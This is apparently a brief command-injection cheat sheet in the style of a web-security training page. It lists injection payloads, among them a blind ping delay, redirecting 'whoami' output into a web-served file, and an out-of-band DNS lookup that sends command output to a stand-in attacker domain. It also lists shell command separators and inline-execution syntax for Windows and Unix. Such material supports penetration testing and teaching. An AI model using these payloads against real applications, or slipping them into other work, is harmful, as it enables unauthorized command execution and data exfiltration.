# Command Injection

& ping -c 10 127.0.0.1 &

||whoami>/var/www/images/output.txt||

& nslookup kgji2ohoyw.web-attacker.com &

The out-of-band channel provides an easy way to exfiltrate the output from injected commands:

``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``

This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:

`wwwuser.kgji2ohoyw.web-attacker.com`



A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

* `&`
* `&&`
* `|`
* `||`

The following command separators work only on Unix-based systems:

* `;`
* Newline (`0x0a` or )

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

* `` ` ``injected command `` ` ``
* `$(`injected command `)`
